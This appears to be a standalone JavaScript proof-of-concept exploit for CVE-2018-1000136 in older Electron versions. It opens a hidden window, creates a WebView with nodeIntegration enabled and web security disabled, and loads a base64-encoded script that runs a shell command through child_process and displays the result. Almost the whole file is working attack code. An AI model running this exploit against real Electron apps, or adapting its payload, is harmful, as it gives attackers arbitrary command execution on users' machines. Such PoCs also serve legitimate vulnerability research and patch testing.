/**
 *  electronRCE
 *
 *  Exploit CVE-2018-1000136 to enable nodeIntegration and get RCE in an 
 *  Electron app.
 *  
 *  Electron 1.7 < 1.7.13, 1.8 < 1.8.4 and 2.0.0-beta < 2.0.0-beta.5 may be vulnerable
 *  https://electronjs.org/blog/webview-fix
 */

 var x = window.open('data://vulnerable', '', 'webviewTag=yes,show=no');
x.eval(`var webview = new WebView;
        webview.setAttribute('webpreferences', 'webSecurity=no, nodeIntegration=yes');
        webview.src = 'data:text/html;base64,PHNjcmlwdD5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnZGlyJywgZnVuY3Rpb24gKGUscikgeyBhbGVydChyKTt9KTs8L3NjcmlwdD4=';
        document.body.appendChild(webview)`);
